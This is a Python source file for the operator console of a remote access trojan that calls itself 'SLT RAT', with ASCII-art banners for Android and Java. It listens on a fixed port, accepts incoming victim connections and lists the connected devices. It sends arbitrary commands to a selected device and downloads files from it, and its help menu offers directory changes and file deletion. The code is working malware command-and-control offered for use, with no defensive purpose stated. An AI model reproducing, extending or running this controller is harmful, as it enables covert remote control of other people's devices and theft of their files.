import socket
import Client as C
import threading
import time
import Progress

# HOST = '10.0.0.215'
HOST = '0.0.0.0'
PORT =  42356

key = True

def getClientres(client , clients , iD ):
    
    output = ""
    buffer = ''

    while True:
        try:
            buffer = client.recv()
        except Exception as e:
            print( e )
            del clients[iD]

        end = buffer.find('.end.' , 0 ,)

        if end != -1:
            buffer = buffer[:end]

        output += buffer
        buffer = ''

        if end != -1 :
            break
        
    buffer = ''
    print(output)


def dowFile(s , client):

    f = open(s , "wb")
    byts = bytearray()
    
    client.send("len?")
    length = int(client.recv())

    if length == 0:
        return -1 

    print("file size = " + str( round( length/pow(2 , 10*2) ,2 )) + " MB")
    t2 = threading.Thread(target = recvFile , args= (byts , client , length , s ,))
    t2.start()

    client.send("send")
    t2.join()

    f.write(byts)
    f.close()
    print("file transfer done")



        
def recvFile(byts ,client, filesize , filename):

    byts.clear()
    buffer = bytearray()

    while True:
        try:
            buffer += client.recvb()
            end = buffer.find(b'.end.' , 0 ,)

            if end != -1:
                byts += buffer[:end]

            Progress.bar("Receiving :" , filename , len(byts) , filesize , 50 , "MB")

            if end != -1:
                break

            byts += buffer

        except:
            pass
        buffer.clear()
    print("\n")




def accseptClients(sock , clients):

    while key:
        try:
            conn , address = sock.accept()
        except:
            break
        client = C.Client(conn , address)

        print("[+] Address: " + str(address[0]) +" port : " + str(address[1]) )

        clients.append(client)




def main(sock):

    sock.listen()
    clients = []

    t1 = threading.Thread(target=accseptClients , args=(sock , clients))
    t1.start()

    while True:
        print(">" , end="")
        cmd = input()
        i = 1

        if cmd == "exit":
            sock.close()
            break


        if cmd == "ls" :
            for c in clients:
                try:
                    c.send("test")
                    print( "[" + str(i) + "] > " +  " ip: " + 
                    str(c.get_ip()) + " port :" + 
                    str(c.get_port()) )
                except :
                    clients.remove(c)
                    
                i += 1
            continue
            
        try:
            no = int(cmd)
        except:
            continue
        iD = no-1

        try:
            selClient = clients[no - 1]
        except:
            continue
            
        while True:
                
            print( str("============" + "session " +selClient.get_ip()) + "============")
            data = input()

            if data == "exit" :
                break

            if data == '':
                continue

            if data[:4] =="down":
                s = data.split("\"" , 2)

                if len(s) != 3 :
                    continue

                for i in range(0,len(s)):
                    s[i] = s[i].strip(" ")
                try:
                    selClient.send(s[0] +" "+s[1])

                    if dowFile(s[2] ,selClient) == -1:
                        print("can't download this file")

                except Exception as e:
                    print(e)
                s.clear()
                continue


            try:
                selClient.send(data)
                getClientres(selClient , clients , iD )
            except Exception as e:
                print(e)
                break


#############################################################################################
#                                    DRIVER PROGRAM                                         #
#                              Created by: Ramesh Shyaman                                   #
#############################################################################################


RAT = """
\33[31m                                                                     
                                                                   .`                               
                                                              `//`hMN:                              
                                 .:/oyhdmNNMMMNmdhs+:.        mMMNNMMmo/-`                          
                            `:ohNMMMMMMMMMMMMMMMMMMMMMNmhyssssdMMMMMMMMMMNmy+:`                     
                         -odNMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMNh+-`                 
                      .odNMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMNNh:               
                    :yNMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMo.               
                  -hNMMMMMMMMMMMMMMMMMMNMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMNmho-                 
                 +NMMMMMMMMNMMMMMMMMMNNMMNMNMMMMMMMMMMMMMMNMNMMMMMMMMNmdyyo+/-.`                    
                oMMMMMNMNNNNMMNMNMNMMNNMMNMNMNMMMNNMMNMNNNMMNMNMMNNho-.. -.-`                       
               :MMMMMMMMNMNNNMNMNMNMMNNMMNMNMNNNNNNNMMMNNMMNNMMNMdo.:` ` -.-.                       
               dMMMMMMNMMMMNNMMMNMNNMMMMMNMMNMMMNMNNMMMMMMMMMNMNs-` `... .` .`                      
               NMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMo                                    
               NMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMm                                     
               hMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMm                                     
          ``-+hNMMMMMMMMMMMMMMMMMMMMMMMMMMMMMNhs+/::/sdNMMMMMMMs                                    
       `:sdNMNNNNMMMMMMMMMMMMMMMMMMMMMMMMMms:`         ./yNMMMMMy`                                  
      +mMNy+:. ``+dNMMMMMMMMMMMMMMMMMMMMm+`               `/hNMMMh-                                 
     sMN+`          .-/+ohNMMMMMMMMMNms:                     `/hMMMmhyo/.                           
    `MMo                   -+smMNMNhy:                          `:ohmdyo:                           
     dMy                       /..::                                 ..                             
     .mMs`               .-:+++++////::---..`                                                       
      `smNy+:-----:/+syyys+:-`````     ``  `..``                                                    
        `:oyyhhhyyso/-.`                                                                            
             ````                                                                                   
\33[34m    
#############################################################################################
#                                          SLT  RAT                                         #
#                                 Created by: Ramesh Shyaman                                #
#############################################################################################

\33[0m   
"""


java='''
\33[31m    
                                                                                                    
                                                                                                    
                                                         ``                                         
                                                         -:`                                        
                                                         -::`                                       
                                                        `:::.                                       
                                                        .:::-                                       
                                                       `::::-                                       
                                                     `.:::::.                                       
                                                   `.-:::::-                                        
                                                `.-:::::::.                                         
                                              `-::::::::-`       `                                  
                                           `.:::::::::-`     `.---`                                 
                                         `-:::::::::.`  ``.-:::-`                                   
                                       `-::::::::-.`  `.::::-.`                                     
                                      `-:::::::-`  `.-::::-.                                        
                                     .:::::::.`  `.:::::-`                                          
                                    `::::::-`   `-:::::-`                                           
                                    .::::::.    .::::::`                                            
                                    `::::::.    -::::::.                                            
                                    `-:::::-    .:::::::.                                           
                                     `-:::::`   `-:::::::-`                                         
                                      `-::::-`   `-:::::::-                                         
                                       `.::::.    `-:::::::`                                        
                                         `-:::.     .-:::::`                                        
                                           `-::`     .::::.                                         
                              ``..---:.      `--`    .:::.          `-/oyhhdhyo:                    
                        ./oyhdmmmdhyso:             `::.`           -ssyhdmmmmmmh.                  
                      `smmmmmmds/.```               ..```...-::/+os-   ```-odmmmmh`                 
                      `ymmmmmmmdddddhyyyyyyyyyyyyyhhdddddddddmdhy+.`        /mmmmm/                 
                       `:oyhdmmmmmmmmmmmmmmmmmmmmmmmmmmmdhyso:-``          `ommmmm/                 
                          ``.-:/+sysssssssssssssso++/:-..``               .smmmmms`                 
                             `/oyhs.                  ``..-:/.`         .odmmmmh/`                  
                             ommmmhso++//////////+oosyyhddmmmdy/.    `-odmmmds/`                    
                             -shdmmmmmmmmmmmmmmmmmmmmmmmmmmddhyy:  .+yddhs+:.                       
                               `-:+oyyhdddddddddhhhyss++/:--.`     :+/-.`                           
                                ``-:/-```````````                                                   
                               `sdmmmy+::-..``````..-:/+oss/.                                       
                               `dmmmmmmmmmmmmmmddmmmmmmmmmmmmy+.                                    
                     ```.--:::` .+ydmmmmmmmmmmmmmmmmmmmmmmmmhs+.           ```                      
                `:+shddmdhso+/`    `.-//ooossyyyyyysoo+/:-.`               /mo                      
               `hmmmmmh+-``                  ``                  ```.-:/oyhmmy`                     
               `ymmmmmmmdhhyso++//::---............----::://+ossyhhddmmmmdho:``.+/                  
                `:shdmmmmmmmmmmmmmmmmmmddddddddddddddmmmmmmmmmmmmddhyso/-.`.:oydd:                  
                   `..-:++ossyyyhhhhhhhhhhhhhhhhhhhhhyyysso++/::-....-:/oshdmmho.                   
                            .ooosssssssssoooo+++++++++oooooooossyyhhddmmmdhyo:.                     
                            `-://+osyyhhdddddddmmmmmmmmmmddddddhhhysso+/-.`                         
                                     ```.....--------------....```                                  
                                                                                                    
                                                                                                    
                                                                                                    
                                                                                                    
\33[0m   
'''

droid='''
\33[31m  
                                                                                                    
                                                                                                    
                                                                                                    
                                                                                                    
                                                                                                    
                         .`                                              `.                         
                        -Nm/                                            +mN-                        
                         sMNo                                          oNMs                         
                          +NMs`                                      `sMN+                          
                           /NMy`                 `                  `yMN/                           
                            :mMh.     .-:/osyhhhddddhhyys+/:-.     .hMm:                            
                             -dMd-:+ydmNMMMMMMMMMMMMMMMMMMMMNmdy+:-dMd-                             
                             `/NMNMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMNMN/`                             
                          `:smMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMms:`                          
                        .odMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMdo.                        
                      -sNMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMNs-                      
                    .sNMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMNs.                    
                   /mMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMm/                   
                 .yMMMMMMMMMMMMNNMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMNNMMMMMMMMMMMMy.                 
                -mMMMMMMMMMMMm+-.:sNMMMMMMMMMMMMMMMMMMMMMMMMMMMMNs:.-+mMMMMMMMMMMMm-                
               -NMMMMMMMMMMMN-     sMMMMMMMMMMMMMMMMMMMMMMMMMMMMs     -MMMMMMMMMMMMN-               
              -NMMMMMMMMMMMMMo    .dMMMMMMMMMMMMMMMMMMMMMMMMMMMMd.    oMMMMMMMMMMMMMN-              
             `mMMMMMMMMMMMMMMMmyshNMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMNhsymMMMMMMMMMMMMMMMm`             
             yMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMy             
            :MMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMN-            
            yMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMy            
           .NMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMN.           
           :mmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmm-           
            ````````````````````````````````````````````````````````````````````````````            
 \33[0m                                                                                                     
'''


grp = "|/_\\"


Help = """\33[96m

commands:
    ls   = list all connected devices
    cd   = change corrent derectory
    del  = delete a file
    down = download file
        Ex: down "test.jpg" "test1.jpg"
\33[0m
"""


sleep = 0.1
dotcount = 10




for i in droid.split("\n"):
    print(i)
    time.sleep(sleep)

sock = socket.socket()

try:
    sock.bind((HOST,PORT))
except Exception as e:
    print("ERROR := " + str(e))
    exit()

RAT = ""

for i in range(0,10):
    print("\r" + "[ " + grp[i%len(grp)] +" ] " + "STARTING".upper() +"."*(i%dotcount) + " "*(dotcount-i%dotcount) ,end="")
    time.sleep(sleep)

print("\rDONE" + " "*30)

print(Help)


main(sock)


